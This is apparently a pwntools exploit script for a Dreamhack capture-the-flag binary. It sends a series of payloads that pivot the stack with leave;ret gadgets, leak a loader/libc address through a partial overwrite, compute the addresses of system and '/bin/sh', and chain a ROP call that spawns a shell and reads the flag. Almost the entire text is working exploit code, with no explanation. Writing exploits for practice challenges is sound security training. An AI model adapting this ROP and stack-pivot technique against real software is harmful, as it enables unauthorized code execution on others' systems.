#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'host3.dreamhack.games'
PORT = 12991

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x0000000000401175
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path, stdin=PTY, stdout=PTY)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# add payload, script here

leave_ret = 0x401176
vuln = 0x0000000000401162
mov_eax_0 = 0x401185
read_plt = 0x401040
ret_read = 0x401175

# LEAK LD
safe = 0x404800

# payload 1
s(b'A' * 32 + p64(0x404820) + p64(vuln))
log.info(b'payload 1')

# payload 2
s(p64(safe) + p64(mov_eax_0) + p64(0x404820) + p64(ret_read)+ p64(0x404058) + p64(vuln))
log.info(b'payload 2')

# payload 3
s(p64(safe) + p64(read_plt) + p64(ret_read) + p64(mov_eax_0) + p64(0x404038) + p64(vuln))
log.info(b'payload 3')

# payload 4
s(b'\xe0')
leak = p.recv(6)
ld_leak = u64(leak.ljust(8, b'\x00'))
libc.address = ld_leak - 0x1147e0
sys = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x0000000000029139 + libc.address

log.info(b'payload 4')
print(f'leaked libc address: {hex(ld_leak)}')
print(f'libc base address: {hex(libc.address)}')
p.recv(42)

# payload 5
s(p64(ld_leak-16) + 24 * b'\x00' + p64(0x404900) + p64(vuln))
log.info(b'payload 5')

# payload 6
s(p64(pop_rdi) + p64(binsh) + p64(sys) + b'C'*8 + p64(0x4048d8) + p64(leave_ret)) 

sl(b'cat flag')
p.interactive()
